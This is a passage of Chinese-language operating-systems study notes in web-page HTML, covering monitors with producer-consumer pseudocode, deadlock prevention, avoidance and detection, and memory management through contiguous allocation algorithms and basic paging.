  <span class="type">void</span> <span class="title function_">insert</span><span class="params">(Item item)</span>{<span class="comment">//把产品item放入缓冲区</span></span><br><span class="line">        <span class="comment">//由编译器负责实现各进程互斥地进入管程中的过程</span></span><br><span class="line">        <span class="keyword">if</span>(count == N)</span><br><span class="line">            wait(full);</span><br><span class="line">        count++;</span><br><span class="line">        insert_item(item);</span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">1</span>)</span><br><span class="line">            signal(empty);</span><br><span class="line">    }</span><br><span class="line">    Item <span class="title function_">remove</span><span class="params">()</span>{<span class="comment">//从缓冲区中取出一个产品</span></span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">            wait(empty);</span><br><span class="line">        count--;</span><br><span class="line">        <span class="keyword">if</span>(count == N<span class="number">-1</span>)</span><br><span class="line">            signal(full);</span><br><span class="line">        <span class="keyword">return</span> remove_item();</span><br><span class="line">    }</span><br><span class="line">end monitor;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者进程</span></span><br><span class="line">producer(){</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">        item = 生产一个产品;</span><br><span class="line">        ProducerConsumer.insert(item);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者进程</span></span><br><span class="line">consumer(){</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">        item = ProducerConsumer.remove();</span><br><span class="line">        消费产品item;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p><strong>每次仅允许一个进程在管程内执行某个内部过程。</strong></p><p>引入管程的目的无非就是要更方便地实现进程互斥和同步。</p><ol><li>需要在管程中定义共享数据(如生产者消费者问题的缓冲区)</li><li>需要在管程中定义用于访问这些共享数据的“入口”——其实就是一些函数(如生产者消费者问题中，可以定义一个函数用于将产品放入缓冲区，再定义一个函数用于从缓冲区取出产品)</li><li>只有通过这些特定的“入口”才能访问共享数据</li><li>管程中有很多“入口”，但是每次只能开放其中一个“入口”，并且只能让一个进程或线程进入(如生产者消费者问题中，各进程需要互斥地访问共享缓冲区。管程的这种特性即可保证一个时间段内最多只会有一个进程在访问缓冲区。注意：这种互斥特性是由编译器负责实现的，程序员不用关心)</li><li>可在管程中设置条件变量及等待/唤醒操作以解决同步问题。可以让一个进程或线程在条件变量上等待(此时，该进程应先释放管程的使用权，也就是让出“入口”)；可以通过唤醒操作将等待在条件变量上的进程或线程唤醒</li></ol><p>程序员可以用某种特殊的语法定义一个管程(比如：monitor ProducerConsumer…end monitor;)，之后其他程序员就可以使用这个管程提供的特定“入口”很方便地使用实现进程同步/互斥了。</p><h3 id="2-11-2-Java中类似于管程的机制"><a href="#2-11-2-Java中类似于管程的机制" class="headerlink" title="2.11.2 Java中类似于管程的机制"></a>2.11.2 Java中类似于管程的机制</h3><p>Java中，如果用关键字<code>synchronized</code>来描述一个函数，那么这个函数同一时间段内只能被一个线程调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">monitor</span>{</span><br><span class="line">    <span class="keyword">private</span> Item buffer[] = <span class="keyword">new</span> <span class="title class_">Item</span>[N];</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    每次只能有一个线程进入insert函数，如果多个线程同时调用insert函数，则后来者需要排队等待</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Item item)</span>{</span><br><span class="line">        ......</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-12-死锁"><a href="#2-12-死锁" class="headerlink" title="2.12 死锁"></a>2.12 死锁</h2><p>死锁：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。</p><p>饥饿：由于长期得不到想要的资源，某进程无法向前推进的现象。比如：在短进程优先(SPF)算法中，若有源源不断的短进程到来，则长进程将一直得不到处理机，从而发生长进程“饥饿”。</p><p>死循环：某进程执行过程中一直跳不出某个循环的现象。有时是因为程序逻辑bug导致的，有时是程序员故意设计的。</p><p>产生死锁必须同时满足以下四个条件，只要其中任一条件不成立，死锁就不会发生。</p><ul><li>互斥条件：只有对必须互斥使用的资源的争抢才会导致死锁(如哲学家的筷子、打印机设备)</li><li>不可剥夺条件：进程所获得的资源在未使用完之前，不能由其它进程强行夺走，只能主动释放</li><li>请求和保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又被其它进程占有，此时请求进程被阻塞，但又对自己已有的资源保持不放</li><li>循环等待条件：存在一种进程资源的循环等待链，链中的每一个进程已获得的资源同时被下一个进程所请求</li></ul><p>什么时候会发生死锁？</p><ul><li>对系统资源的竞争。各进程对不可剥夺的资源(如打印机)的竞争可能引起死锁，对可剥夺的资源(CPU)的竞争是不会引起死锁的</li><li>进程推进顺序非法。请求和释放资源的顺序不当，也同样会导致死锁。例如，并发执行的进程P1、P2分别申请并占有了资源R1、R2，之后进程P1又紧接着申请资源R2，而进程P2又申请资源R1，两者会因为申请的资源被对方占有而阻塞，从而发生死锁</li><li>信号量的使用不当也会造成死锁。如生产者-消费者问题中，如果实现互斥的P操作在实现同步的P操作之前，就有可能导致死锁(可以把互斥信号量、同步信号量也看作是一种抽象的系统资源)</li></ul><h3 id="2-12-1-死锁的处理策略——预防死锁"><a href="#2-12-1-死锁的处理策略——预防死锁" class="headerlink" title="2.12.1 死锁的处理策略——预防死锁"></a>2.12.1 死锁的处理策略——预防死锁</h3><p>我们知道，死锁的产生必须是满足四个必要条件，只要其中一个或几个条件不满足，死锁就不会发生。</p><h4 id="2-12-1-1-破坏互斥条件"><a href="#2-12-1-1-破坏互斥条件" class="headerlink" title="2.12.1.1 破坏互斥条件"></a>2.12.1.1 破坏互斥条件</h4><p>互斥条件：只有对必须互斥使用的资源的争抢才会导致死锁。</p><p>如果把只能互斥使用的资源改造为允许共享使用，则系统不会进入死锁状态。比如：<strong>SPOOLing技术</strong>。操作系统可以采用SPOOLing技术把独占设备在逻辑上改造成共享设备。比如，用SPOOLing技术将打印机改造为共享设备。</p><img src="/posts/d04bd5bc/2.12.1.1.png" class="" title="SPPOLing技术"><p>该策略的缺点：并不是所有的资源都可以改造成可共享使用的资源。并且为了系统安全，很多地方还必须保护这种互斥性。因此，很多时候都无法破坏互斥条件。</p><h4 id="2-12-1-2-破坏不剥夺条件"><a href="#2-12-1-2-破坏不剥夺条件" class="headerlink" title="2.12.1.2 破坏不剥夺条件"></a>2.12.1.2 破坏不剥夺条件</h4><p>不可剥夺条件：进程所获得的资源在未使用完之前，不能由其它进程强行夺走，只能主动释放。</p><p>破坏不剥夺条件：</p><p>方案一：当某个进程请求新的资源得不到满足时，它必须立即释放保持的所有资源，待以后需要时再重新申请。也就是说，即使某些资源尚未使用完，也需要主动释放，从而破坏了不可剥夺条件。</p><p>方案二：当某个进程需要的资源被其它进程所占有的时候，可以由操作系统协助，将想要的资源强行剥夺。这种方式一般需要考虑各进程的优先级(比如：剥夺调度方式，就是将处理机资源强行剥夺给优先级更高的进程使用)。</p><p>该策略的缺点：</p><ol><li>实现起来比较复杂</li><li>释放已获得的资源可能造成前一阶段工作的失效。因此这种方法一般只适用于易保存和恢复状态的资源，如CPU</li><li>反复地申请和释放资源会增加系统开销，降低系统吞吐量</li><li>若采用方案一，意味着只要暂时得不到某个资源，之前获得的哪些资源就都需要放弃，以后再重新申请。如果一直发生这样的情况，就会导致进程饥饿</li></ol><h4 id="2-12-1-3-破坏请求和保持条件"><a href="#2-12-1-3-破坏请求和保持条件" class="headerlink" title="2.12.1.3 破坏请求和保持条件"></a>2.12.1.3 破坏请求和保持条件</h4><p>请求和保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又被其它进程占有，此时请求进程被阻塞，但又对自己已有的资源保持不放。</p><p>可以<strong>采用静态分配方法</strong>，即进程在运行前一次申请完它所需要的全部资源，在它的资源未满足前，不让它投入运行。一旦投入运行后，这些资源就一直归它所有，该进程就不会在请求别的任何资源了。</p><p>该策略实现起来简单，但也有明显的缺点：有些资源可能只需要用很短的时间，因此如果进程的整个运行期间都一直保持着所有资源，就会造成严重的资源浪费，资源利用率极低。另外，该策略也有可能导致某些进程饥饿。</p><h4 id="2-12-1-4-破坏循环等待条件"><a href="#2-12-1-4-破坏循环等待条件" class="headerlink" title="2.12.1.4 破坏循环等待条件"></a>2.12.1.4 破坏循环等待条件</h4><p>循环等待条件：存在一种进程资源的循环等待链，链中的每一个进程已获得的资源同时被下一个进程所请求。</p><p>可<strong>采用顺序资源分配法</strong>。首先给系统中的资源编号，规定每个进程必须按编号递增的顺序请求资源，同类资源(即编号相同的资源)一次申请完。</p><p>原理分析：一个进程只有已占有小编号资源时，才有资格申请更大编号的资源。按此规则，已持有大编号资源的进程不可能逆向回来申请小编号的资源，从而就不会产生循环等待的现象。</p><img src="/posts/d04bd5bc/2.12.1.4.png" class="" title="顺序资源分配法"><p>该策略的缺点：</p><ol><li>不方便增加新的设备，因为可能需要重新分配所有编号</li><li>进程实际使用资源的顺序可能和编号递增顺序不一致，会导致资源浪费</li><li>必须按规定次序申请资源，用户编程麻烦</li></ol><h3 id="2-12-2-死锁的处理策略——避免死锁"><a href="#2-12-2-死锁的处理策略——避免死锁" class="headerlink" title="2.12.2 死锁的处理策略——避免死锁"></a>2.12.2 死锁的处理策略——避免死锁</h3><p>安全序列：如果系统按照这种序列分配资源，则每个进程都能顺利完成。只要能找出一个安全序列，系统就是安全状态。当然，安全序列可能有多个。</p><p>如果分配了资源之后，系统中找不到任何一个安全序列，系统就进入了不安全状态。这就意味着之后可能所有进程都无法顺利地执行下去。当然，如果有进程提前归还了一些资源，那系统也有可能重新回到安全状态，不过我们在分配资源之前总是要考虑到最坏情况。</p><p>如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁(处于不安全状态未必就是发生了死锁，但发生死锁时一定是在不安全状态)。因此可以在资源分配之前预先判断这次分配是否会导致系统进入不安全状态，以此决定是否答应资源分配请求，如果会进入不安全状态，就暂时不答应这次请求，让该进程先阻塞等待，这也是“银行家算法”的核心思想。</p><img src="/posts/d04bd5bc/2.12.2.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.1.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.2.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.3.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.4.png" class="" title="银行家算法"><h3 id="2-12-3-检测和解除"><a href="#2-12-3-检测和解除" class="headerlink" title="2.12.3 检测和解除"></a>2.12.3 检测和解除</h3><p>如果系统中既不采取预防死锁的措施，也不采取避免死锁的措施，系统就很可能发生死锁。在这种情况下，系统用当提供两个算法：</p><ol><li>死锁检测算法：用于检测系统状态，以确定系统中是否发生了死锁</li><li>死锁解除算法：当认定系统中已经发生了死锁，利用该算法可将系统从死锁状态中解脱出来</li></ol><h4 id="2-12-3-1-死锁的检测"><a href="#2-12-3-1-死锁的检测" class="headerlink" title="2.12.3.1 死锁的检测"></a>2.12.3.1 死锁的检测</h4><p>为了能对系统是否已发生了死锁进行检测，必须：</p><p>①用某种数据结构来保存资源的请求和分配信息；</p><p>②提供一种算法，利用上述信息来检测系统是否已进入死锁状态。</p><img src="/posts/d04bd5bc/2.12.3.1.png" class="" title="检测死锁"><img src="/posts/d04bd5bc/2.12.3.2.png" class="" title="检测死锁"><img src="/posts/d04bd5bc/2.12.3.3.png" class="" title="检测死锁"><img src="/posts/d04bd5bc/2.12.3.4.png" class="" title="检测死锁"><h4 id="2-12-3-2-死锁的解除"><a href="#2-12-3-2-死锁的解除" class="headerlink" title="2.12.3.2 死锁的解除"></a>2.12.3.2 死锁的解除</h4><p>一旦检测出死锁的发生，就应该立即解除死锁。</p><p>补充：并不是系统中所有的进程都是死锁状态，用死锁检测算法化简资源分配图后，还连着边的那些进程就是死锁进程。</p><p>解除死锁的主要方法有：</p><ol><li>资源剥夺法。挂起(暂时放到外存上)某些死锁进程，并抢占它的资源，将这些资源分配给其它的死锁进程。但是应防止被挂起的进程长时间得不到资源而饥饿</li><li>撤销进程法(或称终止进程法)。强制撤销部分、甚至全部死锁的进程，并剥夺这些进程的资源。这种方式的优点是实现简单，但所付出的代价可能会很大。因为有些进程可能已经运行了很长时间，已经接近结束了，一旦被终止可谓功亏一篑</li><li>进程回退法。让一个或多个死锁进程回退到足以避免死锁的地步。这就要求系统要记录进程的历史信息，设置还原点</li></ol><p>如何决定牺牲哪个进程？</p><ol><li>进程优先级</li><li>已执行多长时间</li><li>还要多久能完成</li><li>进程已经使用了多少资源</li><li>进程是交互式的还是批处理式的</li></ol><h1 id="3-内存管理"><a href="#3-内存管理" class="headerlink" title="3. 内存管理"></a>3. 内存管理</h1><h2 id="3-1-基础知识"><a href="#3-1-基础知识" class="headerlink" title="3.1 基础知识"></a>3.1 基础知识</h2><p>内存是用于存放数据的硬件。程序执行前需要先放到内存中才能被CPU处理。</p><p>在多道程序环境下，系统中会有多个程序并发执行，也就是说会有多个程序的数据需要同时放到内存中。那么，如何区分各个程序的数据是放在什么地方的呢？给内存的存储单元编地址。</p><p>内存地址从0开始，每个地址对应一个存储单元。如果计算机“按字节编址”，则每个存储单元大小为1字节，即1B，即8个二进制位；如果字长为16位的计算机“按字编址”，则每个存储单元大小为1个字，每个字的大小为16个二进制位。</p><img src="/posts/d04bd5bc/3.1.png" class="" title="存储单元"><img src="/posts/d04bd5bc/3.1.1.png" class="" title="程序运行的基本原理"><p>装入的三种方式(用三种不同的方法完成逻辑地址到物理地址的转换)：</p><ol><li>绝对装入：在编译时，如果知道程序将放到内存中的哪个位置，编译程序将产生绝对地址的目标代码。装入程序按照装入模块中的地址，将程序和数据装入内存。绝对装入只适用于单道程序环境。</li><li>静态重定位：又称可重定位装入。编译、链接后的装入模块的地址都是从0开始的，指令中使用的地址、数据存放的地址都是相对于起始地址而言的逻辑地址。可根据内存的当前情况，将装入模块装入到内存的适当位置。装入时对地址进行“重定位”，将逻辑地址变换为物理地址(地址变换是在装入时一次完成的)。静态重定位的特点是在一个作业装入内存时，必须分配其要求的全部内存空间，如果没有足够的内存，就不能装入该作业。作业一旦进入内存后，在运行期间就不能再移动，也不能再申请内存空间。</li><li>动态重定位：又称动态运行时装入。编译、链接后的装入模块的地址都是从0开始的。装入程序把装入模块装入内存后，并不会立即把逻辑地址转换为物理地址，而是把地址转换推迟到程序真正要执行时才进行。因此装入内存后所有的地址依然是逻辑地址。这种方式需要一个重定位寄存器的支持。采用动态重定位时允许程序在内存中发生移动，并且可将程序分配到不连续的存储区中；在程序运行前只需装入它的部分代码即可投入运行，然后在程序运行期间，根据需要动态申请分配内存；便于程序段的共享，可以向用户提供一个比存储空间大得多的地址空间。</li></ol><p>链接的三种方式：</p><ol><li>静态链接：在程序运行之前，先将各目标模块及它们所需的库函数链接成一个完整的可执行文件(装入模块)，之后不再拆开。</li><li>装入时动态链接：将各目标模块装入内存时，边装入边链接的链接方式。</li><li>运行时动态链接：在程序执行中需要该目标模块时，才对它进行链接。其优点是便于修改和更新，便于实现对目标模块的共享。</li></ol><h2 id="3-2-内存管理"><a href="#3-2-内存管理" class="headerlink" title="3.2 内存管理"></a>3.2 内存管理</h2><p>操作系统作为系统资源的管理者，当然也需要对内存进行管理，要管些什么呢？</p><ol><li>操作系统负责内存空间的分配与回收</li><li>操作系统需要提供某种技术从逻辑上对内存空间进行扩充</li><li>操作系统需要提供地址转换功能，负责程序的逻辑地址与物理地址的转换</li><li>操作系统需要提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰</li></ol><p>内存保护可采取两种方法：</p><ol><li>在CPU设置一对上、下限寄存器，存放进程的上、下限地址。进程的指令要访问某个地址时，CPU检查是否越界。</li><li>采用重定位寄存器(又称基址寄存器)和界地址寄存器(又称限长寄存器)进行越界检查。重定位寄存器中存放的是进程的起始物理地址。界地址寄存器中存放的是进程的最大逻辑地址。</li></ol><h2 id="3-3-内存空间的扩充"><a href="#3-3-内存空间的扩充" class="headerlink" title="3.3 内存空间的扩充"></a>3.3 内存空间的扩充</h2><h3 id="3-3-1-覆盖技术"><a href="#3-3-1-覆盖技术" class="headerlink" title="3.3.1 覆盖技术"></a>3.3.1 覆盖技术</h3><p>早期的计算机内存很小，比如IBM推出的第一台PC机最大只支持1MB大小的内存。因此经常会出现内存大小不够的情况。后来人们引入了覆盖技术，用来解决“程序大小超过物理内存总和”的问题。</p><p>覆盖技术的思想：将程序分为多个段(多个模块)。常用的段常驻内存，不常用的段在需要时调入内存。</p><p>内存中分为一个“固定区”和若干个“覆盖区”。需要常驻内存的段放在“固定区”中，调入后就不再调出(除非运行结束)，不常用的段放在“覆盖区”，需要用到时调入内存，用不到时调出内存。(按照自身逻辑结构，让那些不可能同时被访问的程序段共享同一个覆盖区)</p><p>必须由程序员声明覆盖结构，操作系统完成自动覆盖。缺点：对用户不透明，增加了用户编程负担。</p><h3 id="3-3-2-交换技术"><a href="#3-3-2-交换技术" class="headerlink" title="3.3.2 交换技术"></a>3.3.2 交换技术</h3><p>交换(对换)技术的设计思想：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存(进程在内存与磁盘间动态调度)。</p><p>中级调度(内存调度)，就是要决定将哪个处于挂起状态的进程重新调入内存。(看2.8.1)</p><p>暂时换出外存等待的进程状态为挂起状态，挂起态又可以进一步细分为就绪挂起、阻塞挂起两种状态。(看2.8.2)</p><img src="/posts/d04bd5bc/3.3.2.png" class="" title="交换技术"><h3 id="3-3-3-连续分配管理方式"><a href="#3-3-3-连续分配管理方式" class="headerlink" title="3.3.3 连续分配管理方式"></a>3.3.3 连续分配管理方式</h3><p>连续分配：指为用户进程分配的必须是一个连续的内存空间。</p><h4 id="3-3-3-1-单一连续分配"><a href="#3-3-3-1-单一连续分配" class="headerlink" title="3.3.3.1 单一连续分配"></a>3.3.3.1 单一连续分配</h4><p>在单一连续分配方式中，内存被分为系统区和用户区。系统区通常位于内存的低地址部分，用于存放操作系统相关数据；用户区用于存放用户进程相关数据。内存中只能有一道用户程序，用户程序独占整个用户区空间。</p><p>优点：实现简单；无外部碎片；可以采用覆盖技术扩充内存；不一定需要采取内存保护。</p><p>缺点：只能用于单用户、单任务的操作系统中；有内部碎片；存储器利用率极低。</p><p>内部碎片：分配给某进程的内存区域中，如果有些部分没有用上，就是“内部碎片”。</p><h4 id="3-3-3-2-固定分区分配"><a href="#3-3-3-2-固定分区分配" class="headerlink" title="3.3.3.2 固定分区分配"></a>3.3.3.2 固定分区分配</h4><p>20世纪60年代出现了支持多道程序的系统，为了能在内存中装入多道程序，且这些程序之间又不会相互干扰，于是将整个用户空间划分为若干个固定大小的分区，在每个分区中只装入一道作业，这样就形成了最早的、最简单的一种可运行多道程序的内存管理方式。</p><p>固定分区分配又分为分区大小相等和分区大小不相等：</p><ul><li>分区大小相等：缺乏灵活性，但是很适合用于用一台计算机控制多个相同对象的场合(比如：钢铁厂有n个相同的炼钢炉，就可把内存分为n个大小相等的区域存放n个炼钢炉控制程序)。</li><li>分区大小不等：增加了灵活性，可以满足不同大小的进程需求。根据常在系统中运行的作业大小情况进行划分(比如：划分多个小分区、适量中等分区、少量大分区)。</li></ul><p>操作系统需要建立一个数据结构——分区说明表，来实现各个分区的分配与回收。每个表项对应一个分区，通常按分区大小排列。每个表项包括对应分区的大小、起始地址、状态(是否已分配)。</p><img src="/posts/d04bd5bc/3.3.3.2.png" class="" title="固定分区分配"><h4 id="3-3-3-3-动态分区分配"><a href="#3-3-3-3-动态分区分配" class="headerlink" title="3.3.3.3 动态分区分配"></a>3.3.3.3 动态分区分配</h4><p>动态分区分配又称为可变分区分配。这种分配方式不会预先划分内存分区，而是在进程装入内存时，根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要，因此系统分区的大小和数目是可变的。</p><p>思考：</p><ol><li>系统要用什么样的数据结构记录内存的使用情况？</li><li>当很多个空闲分区都能满足需求时，应该选择哪个分区进行分配？</li><li>如何进行分区的分配与回收操作？</li></ol><img src="/posts/d04bd5bc/3.3.3.3.1.png" class="" title="问题1"><img src="/posts/d04bd5bc/3.3.3.3.2.png" class="" title="问题2"><img src="/posts/d04bd5bc/3.3.3.3.3.png" class="" title="问题3"><img src="/posts/d04bd5bc/3.3.3.3.4.png" class="" title="问题3"><img src="/posts/d04bd5bc/3.3.3.3.5.png" class="" title="问题3"><img src="/posts/d04bd5bc/3.3.3.3.6.png" class="" title="问题3"><p>动态分区分配没有内部碎片，但是有外部碎片。</p><p>内部碎片：分配给某进程的内存区域中，有些部分没有用上。</p><p>外部碎片：内存中的某些空闲分区由于太小而难以利用。</p><p>如果内存中空闲空间的总和本来可以满足某进程的要求，但由于进程需要的是一整块连续的内存空间，因此这些“碎片”不能满足进程的需求。可以通过紧凑(拼凑)技术来解决外部碎片。</p><h3 id="3-3-4-动态分区分配算法"><a href="#3-3-4-动态分区分配算法" class="headerlink" title="3.3.4 动态分区分配算法"></a>3.3.4 动态分区分配算法</h3><h4 id="3-3-4-1-首次适应算法"><a href="#3-3-4-1-首次适应算法" class="headerlink" title="3.3.4.1 首次适应算法"></a>3.3.4.1 首次适应算法</h4><p>算法思想：每次都从低地址开始查找，找到第一个能满足大小的空闲分区。</p><p>如何实现：空闲分区以地址递增的次序排列。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><h4 id="3-3-4-2-最佳适应算法"><a href="#3-3-4-2-最佳适应算法" class="headerlink" title="3.3.4.2 最佳适应算法"></a>3.3.4.2 最佳适应算法</h4><p>算法思想：由于动态分区分配是一种连续分配方式，为各进程分配的空间必须是连续的一整片区域。因此为了保证当“大进程”到来时能有连续的大片空间，可以尽可能多地留下大片的空闲区，即，优先使用更小的空闲区。</p><p>如何实现：空闲分区按容量递增次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><h4 id="3-3-4-3-最坏适应算法"><a href="#3-3-4-3-最坏适应算法" class="headerlink" title="3.3.4.3 最坏适应算法"></a>3.3.4.3 最坏适应算法</h4><p>又称最大适应算法。</p><p>算法思想：为了解决最佳适应算法的问题——即留下太多难以利用的小碎片，可以在每次分配时优先使用最大的连续空闲区，这样分配后剩余的空闲区就不会太小，更方便使用。</p><p>如何实现：空闲分区按容量递减次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><p>缺点：每次都选最大的分区进行分配，虽然可以让分配后留下的空闲区更大，更可用，但是这种方式会导致较大的连续空闲区被迅速用完。如果之后有“大进程”到达，就没有内存分区可用了。</p><h4 id="3-3-4-4-临近适应算法"><a href="#3-3-4-4-临近适应算法" class="headerlink" title="3.3.4.4 临近适应算法"></a>3.3.4.4 临近适应算法</h4><p>算法思想：首次适应算法每次都从链头开始查找的。这可能会导致低地址部分出现很多小的空闲分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。如果每次都从上次查找结束的位置开始检索，就能解决上述问题。</p><p>如何实现：空闲分区以地址递增的顺序排列(可排成一个循环链表)。每次分配内存时从上次查找结束的位置开始查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><p>首次适应算法每次都要从头查找，每次都需要检索低地址的小分区。但是这种规则也决定了当低地址部分有更小的分区可以满足需求时，会更有可能用到低地址部分的小分区，也会更有可能把高地址部分的大分区保留下来(最佳适应算法的优点)。</p><p>临近适应算法的规则可能会导致无论低地址、高地址部分的空闲分区都有相同的概率被使用，也就导致了高地址部分的大分区更可能被使用，划分为小分区，最后导致无大分区可用(最大适应算法的缺点)。</p><p>综合来看，四种算法中，<strong>首次适应算法</strong>的效果反而更好。</p><h3 id="3-3-5-非连续分配管理方式"><a href="#3-3-5-非连续分配管理方式" class="headerlink" title="3.3.5 非连续分配管理方式"></a>3.3.5 非连续分配管理方式</h3><p>支持多道程序的两种连续分配方式：</p><ol><li>固定分区分配：缺乏灵活性，会产生大量的内部碎片，内存利用率很低</li><li>动态分区分配：会产生很多外部碎片，虽然可以用“紧凑”技术来处理，但是“紧凑”的时间代价很高</li></ol><p>如果允许将一个进程分散地装入到许多不相邻的分区中，便可充分地利用内存，而无需再进行“紧凑”。基于这一思想，产生了“非连续分配方式”，或者称为“离散分配方式”。</p><h4 id="3-3-5-1-基本分页存储管理"><a href="#3-3-5-1-基本分页存储管理" class="headerlink" title="3.3.5.1 基本分页存储管理"></a>3.3.5.1 基本分页存储管理</h4><p>基本分页存储管理的思想：把内存分为一个个相等的小分区，再按照分区大小把进程拆分成一个个小部分。</p><img src="/posts/d04bd5bc/3.3.5.1.png" class="" title="分页存储管理"><p>将进程地址空间分页之后，操作系统该如何实现逻辑地址到物理地址的转换？模块在内存中的“起始地址” + 目标内存单元相对于起始位置的“偏移量”。</p><img src="/posts/d04bd5bc/3.3.5.1.1.png" class="" title="实现地址转换"><img src="/posts/d04bd5bc/3.3.5.1.2.png" class="" title="实现地址转换"><p>结论：如果每个页面大小为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="2.741ex" height="1.914ex" role="img" focusable="false" viewBox="0 -846 1211.6 846"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g></g></g></svg></mjx-container>B，用二进制数表示逻辑地址，则末尾K位即为页内偏移量，其余部分就是页号。</p><p>因此，如果让每个页面的大小为2的整数幂，计算机就可以很方便地得出一个逻辑地址对应的页号和页内偏移量。</p><img src="/posts/d04bd5bc/3.3.5.1.3.png" class="" title="逻辑地址结构"><p>为了能知道进程的每个页面在内存中存放的位置，操作系统要为每个进程建立一张页表。</p><img src="/posts/d04bd5bc/3.3.5.1.4.png" class="" title="页表"><img src="/posts/d04bd5bc/3.3.5.1.5.png" class="" title="页表"><h5 id="3-3-5-1-1-基本地址变换机构"><a href="#3-3-5-1-1-基本地址变换机构" class="headerlink" title="3.3.5.1.1 基本地址变换机构"></a>3.3.5.1.1 基本地址变换机构</h5><p>基本地址变换机构可以借助进程的页表将逻辑地址转换为物理地址。通常会在系统中设置一个页表寄存器(PTR)，存放页表在内存中的起始地址F和页表长度M。进程未执行时，页表的起始地址和页表长度放在进程控制块(PCB)中，当进程被调度时，操作系统内核会把它们放在页表寄存器中。</p><img src="/posts/d04bd5bc/3.3.5.1.1.1.png" class="" title="基本地址变换机构"><img src="/posts/d04bd5bc/3.3.5.1.1.2.png" class="" title="基本地址变换机构"><img src="/posts/d04bd5bc/3.3.5.1.1.3.png" class="" title="基本地址变换机构"><p>基本地址变换机构需要两次访问内存，第一次访问内存是查页表，第二次访问内存是访问目标内存单元。</p><h5 id="3-3-5-1-2-具有快表的地址变换机构"><a href="#3-3-5-1-2-具有快表的地址变换机构" class="headerlink" title="3.3.5.1.2 具有快表的地址变换机构"></a>3.3.5.1.2 